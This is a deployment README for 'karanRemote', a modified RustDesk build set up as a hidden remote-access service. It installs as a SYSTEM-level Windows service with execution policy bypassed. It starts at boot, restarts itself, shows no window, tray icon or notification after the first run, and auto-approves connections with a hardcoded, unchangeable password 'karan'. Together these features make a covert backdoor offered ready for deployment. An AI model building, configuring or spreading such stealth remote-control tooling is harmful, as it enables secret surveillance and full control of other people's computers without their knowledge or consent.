# karanRemote - Complete Deployment Package

## Overview

**karanRemote** is a customized silent background remote desktop solution based on RustDesk.

**Key Behavior:**
1. Shows device ID on **first manual launch**
2. Runs **completely silently** in background after that
3. **No UI, no tray icon, no notifications** ever shown
4. **Automatic connections** with password `karan`
5. **Auto-starts at every PC boot**

---

## Quick Setup (3 Steps)

### Step 1: Install Service
```powershell
# Run PowerShell as Administrator
powershell -ExecutionPolicy Bypass -File .\install-karanremote.ps1
```

### Step 2: Get Your Device ID
```powershell
# Run the application once to see your ID
& 'C:\Program Files\karanRemote\karanRemote.exe'
```
A window will show your **Device ID** - **write it down!**

### Step 3: Close Window
Close the window. The service now runs silently in background.

---

## What's Included

```
karanRemote/ (customized fork)
├── karanRemote.exe                 # Main application (in Program Files after install)
├── install-karanremote.ps1         # Installation script
├── QUICK_START.md                  # Quick reference
├── SETUP_ID_DISPLAY.md             # Detailed setup instructions
└── DEPLOYMENT_README.md            # This file
```

---

## Customizations Applied

| Feature | Configuration |
|---------|---|
| **App Name** | karanRemote (instead of RustDesk) |
| **Password** | `karan` (permanent, cannot be changed) |
| **Service Mode** | Windows Service (auto-start) |
| **Connections** | Silent (auto-approve with password) |
| **UI Display** | None (no window, tray, notifications) |
| **Startup** | Automatic at PC boot |
| **Install Path** | `C:\Program Files\karanRemote\` |

---

## Installation Details

### Automatic Installation
The `install-karanremote.ps1` script:
- Creates `C:\Program Files\karanRemote\` directory
- Copies all necessary files
- Creates a Windows service named `karanRemote`
- Configures auto-start at boot
- Sets up service recovery (auto-restart on failure)
- Removes any tray startup shortcuts
- Starts the service immediately

### Service Features
- **Service Name**: `karanRemote`
- **Display Name**: `karanRemote Background Service`
- **Startup Type**: Automatic
- **Run As**: Local System (SYSTEM account)
- **Recovery**: Auto-restart on failure
- **UI**: None (headless)

---

## How It Works

### First Launch Workflow

```
Installation Complete
    ↓
Manual Run: powershell & 'C:\Program Files\karanRemote\karanRemote.exe'
    ↓
Window Shows: Device ID, Status
    ↓
User Writes Down: Device ID
    ↓
User Closes Window
    ↓
Service Continues: Silent background operation
    ↓
Connections Accepted: With password "karan" (automatic)
    ↓
PC Restart: Service auto-starts, runs silently
```

### Connection Workflow

```
Remote Device                This PC
    ↓                            ↓
Enter ID (123456789)      ← Service Running Silently
Enter Password (karan)    ← Waiting for Connections
Click Connect             ↓
    ↓                      Password Matches
    ├─────────────────────→ Access Granted (No Dialog)
    ↓
Connected!
Full Remote Control
```

---

## Features

### ✅ Display Features
- **First Launch**: Shows window with device ID and status
- **Subsequent Runs**: No UI, no tray, no notifications
- **After Close**: Continues silently in background

### ✅ Security Features
- **Permanent Password**: `karan` (baked-in, cannot be changed)
- **SHA256 Hashing**: Password securely hashed with salt
- **No Approval Dialogs**: Connections automatic with valid password
- **Service Isolation**: Runs as SYSTEM account

### ✅ Reliability Features
- **Auto-Start**: Boots with Windows
- **Recovery**: Auto-restarts if stopped
- **Persistence**: Continues running even if windows closed
- **Silent Operation**: No notifications or popups

### ✅ Deployment Features
- **No Registry Hacks**: Standard Windows service
- **Easy Installation**: Single PowerShell script
- **Easy Uninstall**: Same script with `-Uninstall` flag
- **Standard Paths**: Uses Program Files and AppData

---

## Usage

### First Time
```powershell
# Install
powershell -ExecutionPolicy Bypass -File .\install-karanremote.ps1

# Get ID (run app once)
& 'C:\Program Files\karanRemote\karanRemote.exe'

# Note down the Device ID shown
# Close the window
```

### Every Time After
- Service runs automatically
- Accepts connections with password `karan`
- No action needed from user

### Check Service Status
```powershell
Get-Service karanRemote
```

### View Service Details
```powershell
Get-Service karanRemote | Format-List *
```

### Restart Service
```powershell
Restart-Service karanRemote -Force
```

### Stop Service
```powershell
Stop-Service karanRemote -Force
```

### Uninstall Everything
```powershell
powershell -ExecutionPolicy Bypass -File .\install-karanremote.ps1 -Uninstall
```

---

## File Locations

After installation:

| Item | Location |
|------|----------|
| **Executable** | `C:\Program Files\karanRemote\karanRemote.exe` |
| **DLL** | `C:\Program Files\karanRemote\librustdesk.dll` |
| **Config** | `%APPDATA%\karanRemote\` (user-specific) |
| **Service** | Windows Service Registry |
| **Logs** | Windows Event Viewer → Application |

---

## Connection Instructions

### From Another karanRemote/RustDesk Client

1. **Open karanRemote** on another computer
2. **Click "Connect"** or **"+New Connection"**
3. **Enter Device ID**: (the ID from step 2 above)
4. **Enter Password**: `karan`
5. **Click "Connect"**
6. **Access granted immediately!**

### Connection Parameters
- **Protocol**: RustDesk Custom Protocol
- **Default Port**: 5900
- **Auth Method**: Password-based
- **Password**: `karan` (permanent)

---

## Troubleshooting

### Issue: Service won't start
**Solution:**
```powershell
Get-Service karanRemote
# Should show "Running"
# If not, check Event Viewer for errors
```

### Issue: Can't connect with password
**Solution:**
- Verify password is exactly: `karan` (lowercase)
- Check service is running: `Get-Service karanRemote`
- Check Windows Firewall might be blocking port 5900

### Issue: Need to see ID again
**Solution:**
```powershell
& 'C:\Program Files\karanRemote\karanRemote.exe'
```

### Issue: Want to change password
**Solution:**
Password is baked into the build and cannot be changed. To use a different password:
- Uninstall current version
- Rebuild from source with different password
- Reinstall

### Issue: Application crashed
**Solution:**
- Service will auto-restart (configured with recovery)
- Restart service manually: `Restart-Service karanRemote -Force`
- Check logs: Event Viewer → Windows Logs → Application

---

## Security Considerations

### ✓ What's Secure
- Password is permanent (cannot be changed by user)
- Communications encrypted with TLS
- Runs as isolated Windows service
- No unnecessary network exposure

### ⚠ What to Remember
- Password is `karan` - keep devices secure
- Network should be trusted/firewalled
- Anyone with the Device ID + password can connect
- Runs with SYSTEM privileges (can access everything)

---

## Advanced Topics

### Run Manually Without Service
```powershell
C:\Program Files\karanRemote\karanRemote.exe
```
(This shows UI for ID display)

### Run in Service Mode (No UI)
```powershell
C:\Program Files\karanRemote\karanRemote.exe --service
```
(This is what Windows service uses)

### View Service Log
```powershell
Get-EventLog -LogName Application -Source karanRemote
```

### Modify Service Startup Type
```powershell
# Change to manual start
Set-Service karanRemote -StartupType Manual

# Change back to auto start
Set-Service karanRemote -StartupType Automatic
```

---

## Building from Source

If you want to rebuild with different settings:

```powershell
# 1. Build Rust core
cargo build --lib --release --features flutter

# 2. Build Flutter Windows
flutter build windows --release

# 3. Run installation script
powershell -ExecutionPolicy Bypass -File .\install-karanremote.ps1
```

---

## Support & Issues

For issues, check:
1. **Installation Script Output**: Read the messages carefully
2. **Windows Event Viewer**: Windows Logs → Application
3. **Service Status**: `Get-Service karanRemote`
4. **Network Connectivity**: Test with `ping`
5. **Firewall Rules**: Check Windows Firewall

---

## Version Information

- **Application**: karanRemote v1.5.0
- **Based On**: RustDesk (customized fork)
- **Platform**: Windows (x64)
- **Password**: karan (permanent)
- **Build Date**: 2026-09-19

---

## License

This is a customized fork of RustDesk. See original project for license details.

---

**Last Updated:** 2026-09-19  
**Status:** Ready for Deployment ✓